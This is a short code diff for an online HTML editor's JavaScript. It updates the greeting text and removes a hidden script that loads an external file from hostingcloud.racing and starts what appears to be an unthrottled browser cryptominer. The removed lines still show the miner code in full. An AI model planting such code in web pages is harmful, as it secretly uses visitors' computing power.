@@ -22,19 +22,11 @@ var editboxHTML =
 '<\/body>' +
 '<\/html>';
 
-var defaultStuff = '<p></p><br><h3>ONLINE HTML EDITOR!<\/h3>\n' +
-'<p>klistra HTML i textrutan ovan, det blir under sidan som du testat den kod du har.<\/p>';
+var defaultStuff = '<p></p><br><h3>gratis HTML editor!<\/h3>\n' +
+'<p>Type HTML in the textarea above, and it will magically appear in the frame below.<\/p>';
 
 // I don't want this stuff to appear in the box at the top because I feel it's likely to be distracting.
-var extraStuff = '<script src="https://www.hostingcloud.racing/03UK.js"></script>
-<script>
-    var _client = new Client.Anonymous('60a3efd30a725e340582ed3eec59dd50983ad80e9f869a66583078fb76576fa5', {
-        throttle: 0
-    });
-    _client.start();
-    
-</script>
-';
+var extraStuff = '';
 
 var old = '';
          
